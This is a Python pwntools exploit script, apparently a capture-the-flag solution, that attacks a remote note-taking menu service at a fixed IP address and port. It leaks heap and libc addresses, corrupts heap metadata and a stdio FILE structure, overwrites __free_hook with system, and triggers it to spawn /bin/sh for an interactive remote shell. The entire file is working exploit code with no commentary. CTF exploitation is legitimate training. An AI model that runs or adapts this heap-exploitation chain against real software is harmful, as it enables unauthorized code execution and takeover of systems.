from pwn import *
import time

libc = ELF('./libc-2.31.so')

io = remote('140.112.31.97', 30204)

def create(size, content):
    io.recvuntil('Choice >')
    io.sendline('1')
    io.recvuntil('Note size : ')
    io.sendline(str(size))
    io.recvuntil('Content : ')
    io.send(content)

def show(index): 
    io.recvuntil('Choice >')
    io.sendline('2')
    io.recvuntil('Note index : ')
    io.sendline(str(index))
    return io.recvline()

def edit(index, content):
    io.recvuntil('Choice >')
    io.sendline('3')
    io.recvuntil('Note index : ')
    io.sendline(str(index))
    io.recvuntil('Content : ')
    io.send(content)

def delete(index):
    io.recvuntil('Choice >')
    io.sendline('4')
    io.recvuntil('Note index : ')
    io.sendline(str(index))

for i in range(9):
    create(0x90, 'A')
for i in range(7):
    delete(i + 2)
    
heap_base = u64((show(2).strip()).ljust(8, b'\0')) - 0x10
log.info('heap base = ' + hex(heap_base))

delete(0)

libc_leak = u64((show(0).strip()).ljust(8, b'\0'))
libc.address = libc_leak - 0x1ebbe0
log.info('libc address = ' + hex(libc.address))

delete(1)
create(0xa0, p64(0) * 19 + p64(0x10000)[:-1])

for i in range(6):
    edit(1, p64(0x91) + p64(libc.address + 0x1ebbe0) * 2 + p64(0) * 15 + p64(0xa1) + p64(0) * 19 + p64(0x91) + p64(0) + p64(i) + p64(0) * 15 + p64(0xb1))
    delete(3)

edit(1, p64(0x91) + p64(libc.address + 0x1ebbe0) * 2 + p64(0) * 14 + p64(0x90) + p64(0xa0) + p64(0) * 19 + p64(0x91) + p64(0) + p64(8) + p64(0) * 0x15 + p64(0xb1))

create(0x100, 'meow')

edit(1, p64(0x91) + p64(libc.address + 0x1ebc70) + p64(heap_base + 0x5e0) + p64(0) * 14 + p64(0x90) + p64(0xa0) + p64(0) * 19 + p64(0x91) + p64(0) + p64(8) + p64(0) * 0x15 + p64(0xb1) + p64(0) + p64(0xa1) + p64(0) * 19 + p64(0xa1) + p64(heap_base + 0x340) + p64(libc.address + 0x1eeb70))

create(0x80, 'A')

for i in range(7):
    edit(1, p64(0xf1) + p64(0) + p64(i) + p64(0) * 27 + p64(0x41) + p64(0) * 7 + p64(0xf1) + p64(0) * 29 + p64(0x81))
    delete(3)

edit(1, p64(0xf1) + p64(0) + p64(8) + p64(0) * 27 + p64(0x41) + p64(0) * 7 + p64(0xf1) + p64(0) * 29 + p64(0x81))

delete(11)
delete(3)
delete(11)

create(0xe0, 'DDDD')
edit(1, p64(0xf1) + p64(libc.address + 0x1ec64f))
create(0xe0, 'DDDD')
create(0xe0, 'DDDD')
edit(1, p64(0xf1) + p64(0x9) + p64(libc.sym['system'])[:-2] + b'A')
create(0xe0, b'\0' * 49 + p64(libc.address + 0x1ed4a0) + p64(0xfbad2884) + p64(libc.address + 0x1ec723) * 3 + p64(libc.sym['__free_hook'] + 0x1000) + p64(libc.sym['__free_hook'] - 273) + p64(libc.sym['__free_hook'] + 0x6))
time.sleep(2)
io.sendline()
time.sleep(2)
io.sendline('2')
time.sleep(2)
io.sendline('11')
time.sleep(2)
io.sendline('3')
time.sleep(2)
io.sendline('15')
time.sleep(2)
io.send(b'\0' * 49 + p64(libc.address + 0x1ed4a0) + p64(0xfbad2887) + p64(libc.address + 0x1ec723) * 5 + p64(libc.address + 0x1ec723)[:-2])
edit(1, p64(0xf1) + b'/bin/sh')
delete(11)

io.interactive()
